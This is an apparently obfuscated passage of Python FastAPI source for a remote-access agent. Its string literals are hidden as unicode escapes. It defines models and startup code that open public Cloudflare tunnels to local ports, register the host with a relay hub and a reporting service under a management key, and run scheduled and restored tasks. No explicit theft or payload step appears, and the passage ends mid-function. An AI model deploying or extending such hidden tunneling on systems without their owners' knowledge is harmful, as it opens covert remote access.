    count: int = Field(..., description=codecs.decode('\\u96a7\\u9053\\u6570\\u91cf', 'unicode_escape'), examples=[1])
    tunnels: List[ArgoTunnelInfo] = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u96a7\\u9053\\u5217\\u8868', 'unicode_escape'), examples=[[]])

class ArgoTunnelCreateRequest(BaseModel):
    port: Optional[int] = Field(default=None, ge=1, le=65535, description=codecs.decode('\\u96a7\\u9053\\u8f6c\\u53d1\\u7aef\\u53e3\\u002c\\u0020\\u7f3a\\u7701\\u4f7f\\u7528\\u0020\\u0061\\u0067\\u0065\\u006e\\u0074\\u0020\\u81ea\\u8eab\\u76d1\\u542c\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    duplicate: bool = Field(default=False, description=codecs.decode('\\u662f\\u5426\\u5141\\u8bb8\\u540c\\u4e00\\u7aef\\u53e3\\u91cd\\u590d\\u5efa\\u96a7\\u9053\\u0020\\u0028\\u9ed8\\u8ba4\\u0020\\u0066\\u0061\\u006c\\u0073\\u0065\\u0029', 'unicode_escape'), examples=[False])
    quic: bool = Field(default=False, description=codecs.decode('\\u8be5\\u96a7\\u9053\\u8fb9\\u7f18\\u4f20\\u8f93\\u662f\\u5426\\u8d70\\u0020\\u0051\\u0055\\u0049\\u0043\\u0020\\u0028\\u0055\\u0044\\u0050\\u002f\\u0037\\u0038\\u0034\\u0034\\u002c\\u0020\\u7f3a\\u7701\\u0020\\u0068\\u0032\\u0029\\u003b\\u0020\\u0051\\u0055\\u0049\\u0043\\u0020\\u8fde\\u7eed\\u5efa\\u8fde\\u5931\\u8d25\\u81ea\\u52a8\\u56de\\u9000\\u0020\\u0068\\u0032', 'unicode_escape'), examples=[False])
    shz: bool = Field(default=False, description=codecs.decode('\\u521b\\u5efa\\u540e\\u7ed1\\u5b9a\\u0020\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u4e0a\\u62a5\\u0020\\u0028\\u4e0a\\u62a5\\u540d\\u7f3a\\u7701\\u6d3e\\u751f\\u0020\\u004b\\u004e\\u0041\\u004d\\u0045\\u002d\\u7aef\\u53e3\\u0029', 'unicode_escape'), examples=[False])
    shz_name: Optional[str] = Field(default=None, description=codecs.decode('\\u663e\\u5f0f\\u6307\\u5b9a\\u4e0a\\u62a5\\u540d\\u0020\\u0028\\u5b8c\\u6574\\u8986\\u76d6\\u6d3e\\u751f\\u503c\\u002c\\u0020\\u4e0d\\u518d\\u62fc\\u63a5\\u7aef\\u53e3\\u003b\\u0020\\u2265\\u0033\\u0020\\u5b57\\u7b26\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u006d\\u0079\\u0061\\u0070\\u0070', 'unicode_escape')])
    shz_key: Optional[str] = Field(default=None, description=codecs.decode('\\u663e\\u5f0f\\u6307\\u5b9a\\u7ba1\\u7406\\u5bc6\\u94a5\\u0020\\u0028\\u5b8c\\u6574\\u8986\\u76d6\\u6d3e\\u751f\\u503c\\u003b\\u0020\\u2265\\u0038\\u0020\\u5b57\\u7b26\\u002c\\u0020\\u4e0d\\u968f\\u67e5\\u8be2\\u63a5\\u53e3\\u4e0b\\u53d1\\u0029', 'unicode_escape'))

class ArgoTunnelCreateResponse(BaseModel):
    status: str = Field(..., description=codecs.decode('\\u0022\\u006f\\u006b\\u0022\\u0020\\u6216\\u0020\\u0022\\u0065\\u0072\\u0072\\u006f\\u0072\\u0022', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    created: bool = Field(..., description=codecs.decode('\\u96a7\\u9053\\u521b\\u5efa\\u7ed3\\u679c', 'unicode_escape'), examples=[True])
    tunnel_domain: Optional[str] = Field(default=None, description=codecs.decode('\\u4e34\\u65f6\\u96a7\\u9053\\u516c\\u7f51\\u57df\\u540d', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u006c\\u0075\\u0063\\u006b\\u0079\\u002d\\u0077\\u0069\\u006c\\u0064\\u0066\\u006c\\u006f\\u0077\\u0065\\u0072\\u002d\\u0031\\u0061\\u0032\\u0062\\u0033\\u0063\\u0034\\u0064\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')])
    port: int = Field(..., description=codecs.decode('\\u672c\\u6b21\\u8bf7\\u6c42\\u7684\\u8f6c\\u53d1\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    created_at: Optional[str] = Field(default=None, description=codecs.decode('\\u521b\\u5efa\\u65f6\\u95f4\\u0020\\u0028\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0020\\u0055\\u0054\\u0043\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0038\\u002d\\u0031\\u0038\\u0054\\u0031\\u0030\\u003a\\u0030\\u0030\\u003a\\u0030\\u0030\\u005a', 'unicode_escape')])
    transport: Optional[str] = Field(default=None, description=codecs.decode('\\u8fb9\\u7f18\\u4f20\\u8f93\\u003a\\u0020\\u0068\\u0032\\u007c\\u0071\\u0075\\u0069\\u0063', 'unicode_escape'))
    tunnel_status: Optional[str] = Field(default=None, description=codecs.decode('\\u96a7\\u9053\\u72b6\\u6001\\u003a\\u0020\\u0061\\u006c\\u0069\\u0076\\u0065\\u007c\\u0072\\u0065\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006e\\u0067\\u007c\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), examples=[codecs.decode('\\u0061\\u006c\\u0069\\u0076\\u0065', 'unicode_escape')])
    last_error: Optional[str] = Field(default=None, description=codecs.decode('\\u6700\\u8fd1\\u5931\\u8d25\\u539f\\u56e0', 'unicode_escape'))
    last_error_at: Optional[str] = Field(default=None, description=codecs.decode('\\u6700\\u8fd1\\u5931\\u8d25\\u65f6\\u95f4', 'unicode_escape'))
    consecutive_failures: Optional[int] = Field(default=None, description=codecs.decode('\\u8fde\\u7eed\\u5931\\u8d25\\u8f6e\\u6570', 'unicode_escape'), examples=[0])
    shz_name: Optional[str] = Field(default=None, description=codecs.decode('\\u7ed1\\u5b9a\\u4e0a\\u62a5\\u540d\\u0020\\u0028\\u4ec5\\u7ed1\\u5b9a\\u540e\\u8fd4\\u56de\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u006d\\u0079\\u006e\\u0061\\u006d\\u0065\\u002d\\u0038\\u0030\\u0030\\u0030', 'unicode_escape')])
    shz_url: Optional[str] = Field(default=None, description=codecs.decode('\\u7ed1\\u5b9a\\u4e0a\\u62a5\\u5730\\u5740\\u0020\\u0028\\u4ec5\\u7ed1\\u5b9a\\u540e\\u8fd4\\u56de\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u002f\\u007e\\u006d\\u0079\\u006e\\u0061\\u006d\\u0065\\u002d\\u0038\\u0030\\u0030\\u0030', 'unicode_escape')])
    message: Optional[str] = Field(default=None, description=codecs.decode('\\u5931\\u8d25\\u539f\\u56e0', 'unicode_escape'), examples=[codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0061\\u006c\\u0072\\u0065\\u0061\\u0064\\u0079\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0073\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0038\\u0030\\u0030\\u0030\\u002c\\u0020\\u0073\\u0065\\u0074\\u0020\\u0064\\u0075\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0065\\u003d\\u0074\\u0072\\u0075\\u0065\\u0020\\u0074\\u006f\\u0020\\u0066\\u006f\\u0072\\u0063\\u0065\\u0020\\u0063\\u0072\\u0065\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape')])

class ArgoBindRequest(BaseModel):
    port: int = Field(..., ge=1, le=65535, description=codecs.decode('\\u76ee\\u6807\\u96a7\\u9053\\u8f6c\\u53d1\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    tunnel_domain: Optional[str] = Field(default=None, description=codecs.decode('\\u540c\\u7aef\\u53e3\\u591a\\u96a7\\u9053\\u65f6\\u7528\\u4e8e\\u7cbe\\u786e\\u5b9a\\u4f4d', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u006c\\u0075\\u0063\\u006b\\u0079\\u002d\\u0077\\u0069\\u006c\\u0064\\u0066\\u006c\\u006f\\u0077\\u0065\\u0072\\u002d\\u0031\\u0061\\u0032\\u0062\\u0033\\u0063\\u0034\\u0064\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')])
    shz_name: Optional[str] = Field(default=None, description=codecs.decode('\\u663e\\u5f0f\\u6307\\u5b9a\\u4e0a\\u62a5\\u540d\\u0020\\u0028\\u5b8c\\u6574\\u8986\\u76d6\\u6d3e\\u751f\\u503c\\u0020\\u004b\\u004e\\u0041\\u004d\\u0045\\u002d\\u7aef\\u53e3\\u003b\\u0020\\u2265\\u0033\\u0020\\u5b57\\u7b26\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u006d\\u0079\\u0061\\u0070\\u0070', 'unicode_escape')])
    shz_key: Optional[str] = Field(default=None, description=codecs.decode('\\u663e\\u5f0f\\u6307\\u5b9a\\u7ba1\\u7406\\u5bc6\\u94a5\\u0020\\u0028\\u5b8c\\u6574\\u8986\\u76d6\\u6d3e\\u751f\\u503c\\u0020\\u4e0a\\u62a5\\u540d\\u002b\\u0022\\u0031\\u0032\\u0033\\u0022\\u003b\\u0020\\u2265\\u0038\\u0020\\u5b57\\u7b26\\u002c\\u0020\\u4e0d\\u968f\\u67e5\\u8be2\\u63a5\\u53e3\\u4e0b\\u53d1\\u0029', 'unicode_escape'))

class ArgoBindResponse(BaseModel):
    status: str = Field(..., description=codecs.decode('\\u0022\\u006f\\u006b\\u0022\\u0020\\u6216\\u0020\\u0022\\u0065\\u0072\\u0072\\u006f\\u0072\\u0022', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    bound: bool = Field(..., description=codecs.decode('\\u7ed1\\u5b9a\\u7ed3\\u679c\\u0020\\u0028\\u0074\\u0072\\u0075\\u0065\\u003d\\u5df2\\u7ed1\\u5b9a\\u002c\\u0020\\u0066\\u0061\\u006c\\u0073\\u0065\\u003d\\u5df2\\u89e3\\u7ed1\\u6216\\u5931\\u8d25\\u0029', 'unicode_escape'), examples=[True])
    port: int = Field(..., description=codecs.decode('\\u672c\\u6b21\\u8bf7\\u6c42\\u7684\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    tunnel_domain: Optional[str] = Field(default=None, description=codecs.decode('\\u76ee\\u6807\\u96a7\\u9053\\u516c\\u7f51\\u57df\\u540d', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u006c\\u0075\\u0063\\u006b\\u0079\\u002d\\u0077\\u0069\\u006c\\u0064\\u0066\\u006c\\u006f\\u0077\\u0065\\u0072\\u002d\\u0031\\u0061\\u0032\\u0062\\u0033\\u0063\\u0034\\u0064\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')])
    shz_name: Optional[str] = Field(default=None, description=codecs.decode('\\u7ed1\\u5b9a\\u4e0a\\u62a5\\u540d\\u0020\\u0028\\u89e3\\u7ed1\\u540e\\u4e3a\\u7a7a\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u006d\\u0079\\u006e\\u0061\\u006d\\u0065\\u002d\\u0038\\u0030\\u0030\\u0030', 'unicode_escape')])
    shz_url: Optional[str] = Field(default=None, description=codecs.decode('\\u7ed1\\u5b9a\\u4e0a\\u62a5\\u5730\\u5740\\u0020\\u0028\\u89e3\\u7ed1\\u540e\\u4e3a\\u7a7a\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u002f\\u007e\\u006d\\u0079\\u006e\\u0061\\u006d\\u0065\\u002d\\u0038\\u0030\\u0030\\u0030', 'unicode_escape')])
    message: Optional[str] = Field(default=None, description=codecs.decode('\\u5931\\u8d25\\u539f\\u56e0', 'unicode_escape'), examples=[codecs.decode('\\u006e\\u006f\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0038\\u0030\\u0030\\u0030', 'unicode_escape')])

class ArgoTunnelDeleteRequest(BaseModel):
    port: int = Field(..., ge=1, le=65535, description=codecs.decode('\\u8981\\u5220\\u9664\\u7684\\u96a7\\u9053\\u8f6c\\u53d1\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    tunnel_domain: Optional[str] = Field(default=None, description=codecs.decode('\\u540c\\u7aef\\u53e3\\u591a\\u96a7\\u9053\\u65f6\\u7528\\u4e8e\\u7cbe\\u786e\\u5b9a\\u4f4d', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u006c\\u0075\\u0063\\u006b\\u0079\\u002d\\u0077\\u0069\\u006c\\u0064\\u0066\\u006c\\u006f\\u0077\\u0065\\u0072\\u002d\\u0031\\u0061\\u0032\\u0062\\u0033\\u0063\\u0034\\u0064\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')])

class ArgoTunnelDeleteResponse(BaseModel):
    status: str = Field(..., description=codecs.decode('\\u0022\\u006f\\u006b\\u0022\\u0020\\u6216\\u0020\\u0022\\u0065\\u0072\\u0072\\u006f\\u0072\\u0022', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    deleted: int = Field(..., description=codecs.decode('\\u5b9e\\u9645\\u5220\\u9664\\u7684\\u96a7\\u9053\\u6570\\u91cf\\u0020\\u0028\\u6210\\u529f\\u65f6\\u0020\\u003e\\u003d\\u0031\\u0029', 'unicode_escape'), examples=[1])
    port: int = Field(..., description=codecs.decode('\\u672c\\u6b21\\u8bf7\\u6c42\\u7684\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    tunnels: Optional[List[ArgoTunnelInfo]] = Field(default=None, description=codecs.decode('\\u5df2\\u5220\\u9664\\u96a7\\u9053\\u7684\\u660e\\u7ec6', 'unicode_escape'), examples=[[]])
    message: Optional[str] = Field(default=None, description=codecs.decode('\\u5931\\u8d25\\u539f\\u56e0', 'unicode_escape'), examples=[codecs.decode('\\u006e\\u006f\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0038\\u0030\\u0030\\u0030', 'unicode_escape')])

class HubRegisterRequest(BaseModel):
    hub: str = Field(..., description=codecs.decode('\\u006b\\u0069\\u0073\\u0061\\u006d\\u0061\\u002d\\u0068\\u0075\\u0062\\u0020\\u57fa\\u5740\\u0020\\u0028\\u0068\\u0074\\u0074\\u0070\\u002f\\u0068\\u0074\\u0074\\u0070\\u0073\\u0020\\u524d\\u7f00\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0068\\u0075\\u0062\\u002e\\u0065\\u0078\\u0061\\u006d\\u0070\\u006c\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')])
    kname: str = Field(..., description=codecs.decode('\\u6ce8\\u518c\\u540d\\u0020\\u0028\\u5355\\u4e2a\\u0020\\u0068\\u0075\\u0062\\u0020\\u5185\\u552f\\u4e00\\u002c\\u0020\\u89c4\\u5219\\u89c1\\u0020\\u0031\\u0039\\u002e\\u0034\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u006d\\u0079\\u0068\\u006f\\u0073\\u0074', 'unicode_escape')])
    ports: Optional[List[int]] = Field(default=None, description=codecs.decode('\\u7aef\\u53e3\\u53cd\\u4ee3\\u767d\\u540d\\u5355\\u0020\\u0028\\u6ce8\\u518c\\u9879\\u6210\\u7acb\\u5373\\u81ea\\u52a8\\u5e76\\u5165\\u003b\\u0020\\u7f3a\\u7701\\u7a7a\\u003d\\u4e0d\\u6539\\u767d\\u540d\\u5355\\u0029', 'unicode_escape'), examples=[[7788]])

class HubDeleteRequest(BaseModel):
    kname: str = Field(..., description=codecs.decode('\\u8981\\u6ce8\\u9500\\u7684\\u6ce8\\u518c\\u540d', 'unicode_escape'), examples=[codecs.decode('\\u006d\\u0079\\u0068\\u006f\\u0073\\u0074', 'unicode_escape')])

@asynccontextmanager
async def O0_fn_56(app: FastAPI):
    Logger.debug(codecs.decode('\\U0001f527\\u0020\\u521d\\u59cb\\u5316\\u7ba1\\u7406\\u5668\\u002e\\u002e\\u002e', 'unicode_escape'))
    Config.validate()
    O0_fn_4()
    app.state.file_manager = FileManager(root=Config.FILE_ROOT, max_upload=Config.MAX_UPLOAD_SIZE, chunk_size=int(os.getenv(codecs.decode('\\u0043\\u0048\\u0055\\u004e\\u004b\\u005f\\u0054\\u0048\\u0052\\u0045\\u0053\\u0048\\u004f\\u004c\\u0044', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0039\\u0037\\u0031\\u0035\\u0032\\u0030', 'unicode_escape'))), audit=Config.FILE_AUDIT_LOG)
    app.state.task_manager = TaskManager(timeout=Config.TASK_TIMEOUT, check_interval=Config.CRON_CHECK_INTERVAL)
    O0_var_1791 = app.state.task_manager
    if Config.crontasks and (not Config.cronloop):
        O0_var_1791.start_cron_loop()
    if Config.InitTask and Config.onetasks:

        async def _run_restored_onetime():
            try:
                await asyncio.to_thread(O0_var_1791.run_onetime_tasks)
            except Exception as exc:
                Logger.error(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\u274c\\u0020\\u542f\\u52a8\\u4efb\\u52a1\\u6062\\u590d\\u6267\\u884c\\u5f02\\u5e38\\u0020\\u0028\\u4e0d\\u5f71\\u54cd\\u670d\\u52a1\\u0029\\u003a\\u0020', 'unicode_escape') + str(exc))
        asyncio.create_task(_run_restored_onetime())
    app.state.temp_key_manager = TempKeyManager()
    app.state.temp_key_manager.on_expired = Config.rotate_operational_secrets
    app.state.argo_tunnel_manager = ArgoTunnelManager(store=getattr(app.state.task_manager, codecs.decode('\\u0073\\u0074\\u006f\\u0072\\u0065', 'unicode_escape'), None))
    app.state.loopback_session = aiohttp.ClientSession(auto_decompress=False)
    if Config.KMODE == codecs.decode('\\u0031', 'unicode_escape') or (Config.KMODE == codecs.decode('\\u0032', 'unicode_escape') and KModeController.kname_valid()):
        KModeController.activate(app.state.argo_tunnel_manager)
    app.state.hub_registrar = HubTunnelRegistrar()
    if Config.KMODE == codecs.decode('\\u0033', 'unicode_escape'):
        O0_var_1792 = O0_fn_43(Config.KNAME)
        if not Config.KHUB:
            Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u0033\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u004b\\u0048\\u0055\\u0042\\u0020\\u672a\\u8bbe\\u7f6e\\u002c\\u0020\\u004b\\u004d\\u004f\\u0044\\u0045\\u003d\\u0033\\u0020\\u672a\\u751f\\u6548\\u0020\\u0028\\u672c\\u5730\\u670d\\u52a1\\u7167\\u5e38\\u0029', 'unicode_escape'))
        elif O0_var_1792:
            Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u0033\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u0025\\u0073\\u002c\\u0020\\u004b\\u004d\\u004f\\u0044\\u0045\\u003d\\u0033\\u0020\\u672a\\u751f\\u6548\\u0020\\u0028\\u672c\\u5730\\u670d\\u52a1\\u7167\\u5e38\\u0029', 'unicode_escape') % O0_var_1792)
        else:
            O0_var_1793 = list(Config.KHUB_PORTS) if Config.KHUB_PORTS else []
            if not O0_var_1793:
                Logger.info(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u0033\\u005d\\u0020\\U0001f4a1\\u0020\\u004b\\u0048\\u0055\\u0042\\u005f\\u0050\\u004f\\u0052\\u0054\\u0053\\u0020\\u672a\\u914d\\u7f6e\\u002c\\u0020\\u7aef\\u53e3\\u53cd\\u4ee3\\u5df2\\u7981\\u7528\\u0020\\u0028\\u4ec5\\u4e2d\\u7ee7\\u0020\\u002f\\u0061\\u0070\\u0069\\u0020\\u4e0e\\u7ec8\\u7aef\\u0029', 'unicode_escape'))
            O0_var_1794, O0_var_1795, O0_var_1796 = app.state.hub_registrar.register(Config.KHUB, Config.KNAME, ports=O0_var_1793, source=codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074\\u0075\\u0070', 'unicode_escape'), wait_timeout=0)
            if O0_var_1795:
                Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u0033\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u9759\\u6001\\u6ce8\\u518c\\u5931\\u8d25\\u0020\\u0028\\u0025\\u0073\\u003a\\u0020\\u0025\\u0073\\u0029\\u002c\\u0020\\u004b\\u004d\\u004f\\u0044\\u0045\\u003d\\u0033\\u0020\\u672a\\u751f\\u6548', 'unicode_escape') % (O0_var_1795, O0_var_1796))
            else:
                app.state.hub_tunnel_manager = app.state.hub_registrar.get(Config.KNAME)
    O0_var_1797 = []
    O0_var_1798 = getattr(app.state, codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape'), None)
    if O0_var_1798 is not None and getattr(O0_var_1798, codecs.decode('\\u0073\\u0074\\u006f\\u0072\\u0065', 'unicode_escape'), None) is not None:
        try:
            O0_var_1797 = O0_var_1798.store.get_hubregs()
        except Exception as _exc:
            Logger.debug(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u0033\\u005d\\u0020\\u0068\\u0075\\u0062\\u0020\\u6ce8\\u518c\\u4efb\\u52a1\\u6062\\u590d\\u8bfb\\u53d6\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(_exc), 11)
    for O0_var_1799 in O0_var_1797:
        try:
            O0_var_1800, O0_var_1801, O0_var_1802 = app.state.hub_registrar.register(O0_var_1799[codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape')], O0_var_1799[codecs.decode('\\u006b\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')], ports=O0_var_1799.get(codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape')) or [], source=codecs.decode('\\u0064\\u0079\\u006e\\u0061\\u006d\\u0069\\u0063', 'unicode_escape'), wait_timeout=0)
            if O0_var_1801:
                Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u0033\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u6062\\u590d\\u6ce8\\u518c\\u9879\\u0020', 'unicode_escape') + str(O0_var_1799['kname']) + codecs.decode('\\u0020\\u5931\\u8d25\\u0020\\u0028', 'unicode_escape') + str(O0_var_1801) + codecs.decode('\\u003a\\u0020', 'unicode_escape') + str(O0_var_1802) + codecs.decode('\\u0029\\u002c\\u0020\\u8be5\\u9879\\u4e0d\\u6ce8\\u518c\\u0020\\u0028\\u006b\\u0073\\u0074\\u006f\\u0072\\u0065\\u0020\\u6761\\u76ee\\u4fdd\\u7559\\u0029', 'unicode_escape'))
            else:
                Logger.info(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u0033\\u005d\\u0020\\u2705\\u0020\\u5df2\\u6062\\u590d\\u52a8\\u6001\\u6ce8\\u518c\\u9879\\u003a\\u0020', 'unicode_escape') + str(O0_var_1799['kname']) + codecs.decode('\\u0020\\u2192\\u0020', 'unicode_escape') + str(O0_var_1799['hub']))
        except Exception as _exc:
            Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u0033\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u6062\\u590d\\u6ce8\\u518c\\u9879\\u0020', 'unicode_escape') + str(O0_var_1799.get('kname')) + codecs.decode('\\u0020\\u5f02\\u5e38\\u003a\\u0020', 'unicode_escape') + str(_exc))
    O0_var_1803 = getattr(app.state, codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape'), None)
    if O0_var_1803 is not None and getattr(O0_var_1803, codecs.decode('\\u0073\\u0074\\u006f\\u0072\\u0065', 'unicode_escape'), None) is not None:
        try:
            O0_var_1804 = O0_var_1803.store.get_proxyports()
            if isinstance(O0_var_1804, dict):
                for O0_var_1805 in (PROXY_GROUP_HUB, PROXY_GROUP_LOCAL):
                    O0_var_1806 = O0_var_1804.get(O0_var_1805) or []
                    if O0_var_1806:
                        O0_fn_66(O0_var_1805, O0_var_1806)
                O0_var_1807, O0_var_1808 = (len(O0_var_1804.get(codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape')) or []), len(O0_var_1804.get(codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape')) or []))
                Logger.info(codecs.decode('\\u005b\\u0050\\u0072\\u006f\\u0078\\u0079\\u0052\\u006f\\u0075\\u0074\\u0065\\u005d\\u0020\\U0001f4a1\\u0020\\u5df2\\u6062\\u590d\\u53cd\\u4ee3\\u8fd0\\u884c\\u65f6\\u767d\\u540d\\u5355\\u003a\\u0020\\u0048\\u0055\\u0042\\u0020\\u7ec4\\u0020', 'unicode_escape') + str(O0_var_1807) + codecs.decode('\\u0020\\u4e2a\\u002c\\u0020\\u672c\\u5730\\u7ec4\\u0020', 'unicode_escape') + str(O0_var_1808) + codecs.decode('\\u0020\\u4e2a', 'unicode_escape'))
            elif isinstance(O0_var_1804, (list, tuple)) and O0_var_1804:
                O0_fn_66(PROXY_GROUP_LOCAL, O0_var_1804)
                Logger.info(codecs.decode('\\u005b\\u0050\\u0072\\u006f\\u0078\\u0079\\u0052\\u006f\\u0075\\u0074\\u0065\\u005d\\u0020\\U0001f4a1\\u0020\\u5df2\\u6062\\u590d\\u53cd\\u4ee3\\u8fd0\\u884c\\u65f6\\u767d\\u540d\\u5355\\u0020\\u0028\\u65e7\\u5f62\\u72b6\\u5f52\\u5165\\u672c\\u5730\\u7ec4\\u0029\\u003a\\u0020', 'unicode_escape') + str(len(O0_var_1804)) + codecs.decode('\\u0020\\u4e2a\\u7aef\\u53e3', 'unicode_escape'))
        except Exception as _exc:
            Logger.debug(codecs.decode('\\u005b\\u0050\\u0072\\u006f\\u0078\\u0079\\u0052\\u006f\\u0075\\u0074\\u0065\\u005d\\u0020\\u53cd\\u4ee3\\u767d\\u540d\\u5355\\u6062\\u590d\\u8bfb\\u53d6\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(_exc), 11)
    O0_var_1809 = getattr(app.state, codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape'), None)
    O0_var_1810 = getattr(app.state, codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u005f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape'), None)
    O0_var_1811 = getattr(O0_var_1809, codecs.decode('\\u0073\\u0074\\u006f\\u0072\\u0065', 'unicode_escape'), None) if O0_var_1809 is not None else None
    if O0_var_1810 is not None and O0_var_1811 is not None:
        try:
            O0_var_1812 = O0_var_1811.get_argobinds()
        except Exception as _exc:
            O0_var_1812 = []
            Logger.debug(codecs.decode('\\u005b\\u0041\\u0072\\u0067\\u006f\\u0042\\u0069\\u006e\\u0064\\u005d\\u0020\\u7ed1\\u5b9a\\u6062\\u590d\\u8bfb\\u53d6\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(_exc), 11)
        for O0_var_1813 in O0_var_1812:
            O0_var_1814, O0_var_1815 = (O0_var_1813[codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape')], O0_var_1813[codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')])
            O0_var_1816 = O0_var_1813.get(codecs.decode('\\u006b\\u0065\\u0079', 'unicode_escape'))
            try:
                O0_var_1810.create_tunnel(O0_var_1814, silent=True, source=codecs.decode('\\u0072\\u0065\\u0073\\u0074\\u006f\\u0072\\u0065', 'unicode_escape'))
                O0_var_1810.bind_tunnel(O0_var_1814, shz_name=O0_var_1815, shz_key=O0_var_1816)
